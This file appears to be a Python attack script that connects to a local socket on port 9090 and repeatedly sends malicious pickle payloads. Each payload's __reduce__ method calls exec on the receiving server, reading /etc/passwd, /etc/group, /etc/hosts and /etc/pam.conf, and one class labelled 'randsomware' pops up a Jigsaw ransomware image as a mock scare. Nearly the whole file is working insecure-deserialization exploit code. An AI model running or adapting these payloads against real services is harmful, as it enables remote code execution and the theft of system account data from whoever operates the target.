#!/usr/bin/env python3

import socket, pickle, builtins
import sys
import time

HOST = "0.0.0.0"
PORT = 9090


class passwd(object):
    def __reduce__(self):
        return (builtins.exec, ("with open('/etc/passwd','r') as r: print(r.readlines())",))


class group(object):
    def __reduce__(self):
        return (builtins.exec, ("with open('/etc/group','r') as r: print(r.readlines())",))


# Attackers can override DNS and cause your system to communicate with imposter systems by messing with files like /etc/hosts and /etc/resolv.conf.
class hosts(object):
    def __reduce__(self):
        return (builtins.exec, ("with open('/etc/hosts','r') as r: print(r.readlines())",))


# The PAM configuration file, /etc/pam. conf , determines the authentication services to be used, and the order in which the services are used.
# This file can be edited to select authentication mechanisms for each system entry application.
class pam(object):
    def __reduce__(self):
        return (builtins.exec, ("with open('/etc/pam.conf','r') as r: print(r.readlines())",))


class randsomware(object):
    def __reduce__(self):
        # return (builtins.exec, ("with open('/etc/passwd','r') as r: print(r.readlines())",))
        stri = 'from PIL import Image\nImage.open(' + "{}').show()".format("'./jigsaw-ransomware.gif")
        return (builtins.exec, (stri,))


with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
    sock.connect((HOST, PORT))

    while True:
        try:
            sock.sendall(pickle.dumps(passwd()))
            print("send 1")
            time.sleep(0.1)
            sock.sendall(pickle.dumps(group()))
            print("send 2")
            time.sleep(0.1)
            sock.sendall(pickle.dumps(hosts()))
            print("send 3")
            time.sleep(0.1)
            sock.sendall(pickle.dumps(pam()))
            print("send 4")
            time.sleep(0.1)
            sock.sendall(pickle.dumps(randsomware()))
            print("send 5")
            time.sleep(0.1)
            # print (sock.recv(1024))
        except socket.error:
            sys.exit()
        sock.close()
